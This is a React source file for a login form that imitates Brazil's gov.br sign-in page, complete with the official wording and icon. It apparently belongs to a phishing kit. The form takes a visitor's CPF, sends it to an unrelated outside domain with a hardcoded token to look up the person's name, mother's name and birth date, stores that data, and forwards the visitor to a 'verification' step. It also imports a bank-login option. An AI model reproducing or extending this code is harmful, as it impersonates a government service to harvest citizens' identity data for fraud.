import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import BankLoginOption from "./BankLoginOption";
import { Loader2 } from "lucide-react";

interface LoginFormData {
  cpf: string;
}

interface ApiResponse {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  };
}

// Function to format CPF as XXX.XXX.XXX-XX
function formatCPF(value: string): string {
  const numbers = value.replace(/\D/g, '');
  return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, '$1.$2.$3-$4');
}

// Function to remove CPF formatting
function unformatCPF(value: string): string {
  return value.replace(/\D/g, '');
}

export default function LoginForm() {
  const { register, handleSubmit, setValue, watch, formState: { errors } } = useForm<LoginFormData>();
  const [loading, setLoading] = useState(false);
  const [, setLocation] = useLocation();

  // Watch the CPF input to format it
  const cpfValue = watch("cpf", "");
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;
    // Only format if there's a value and it's different from current formatted value
    if (value && value !== cpfValue) {
      value = unformatCPF(value);
      setValue("cpf", formatCPF(value.slice(0, 11)));
    }
  };

  const onSubmit = async (data: LoginFormData) => {
    setLoading(true);
    try {
      // Remove formatting before sending to API
      const unformattedCPF = unformatCPF(data.cpf);
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${unformattedCPF}`);
      const apiData: ApiResponse = await response.json();

      // Store data in localStorage
      localStorage.setItem('userData', JSON.stringify({
        cpf: unformattedCPF,
        nome: apiData.DADOS.nome,
        dataNascimento: apiData.DADOS.data_nascimento,
        nomeMae: apiData.DADOS.nome_mae
      }));

      // Navigate to verification page with the data
      setLocation(`/verificacao?data=${encodeURIComponent(JSON.stringify(apiData.DADOS))}`);
    } catch (error) {
      console.error('Error fetching data:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form method="post" id="loginData" onSubmit={handleSubmit(onSubmit)} noValidate>
      <div className="card" id="login-cpf">
        <h3>Identifique-se no gov.br com:</h3>

        <div className="item-login-signup-ways">
          <a tabIndex={3} style={{ display: 'flex', alignItems: 'center' }}>
            <img 
              src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png" 
              alt="Ícone de um cartão de identificação sólido representando CPF"
            />
            Número do CPF
          </a>
        </div>

        <div className="accordion-panel" id="accordion-panel-id">
          <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>

          <label htmlFor="cpf">CPF</label>
          <input
            id="cpf"
            {...register("cpf", { required: true })}
            onChange={handleCPFChange}
            autoComplete="new-password"
            tabIndex={1}
            type="tel"
            placeholder="Digite seu CPF"
            aria-invalid={errors.cpf ? "true" : "false"}
          />

          <div className="button-panel" id="login-button-panel">
            <button 
              type="submit"
              className="button-continuar flex items-center justify-center gap-2"
              tabIndex={2}
              disabled={loading}
            >
              {loading && <Loader2 className="h-4 w-4 animate-spin" />}
              {loading ? "Acessando..." : "Continuar"}
            </button>
          </div>
        </div>

        <label id="title-outras-op">Outras opções de identificação:</label>
        <hr id="hr-outras-op" style={{margin: "0 0 0"}} />

        <BankLoginOption />
      </div>
    </form>
  );
}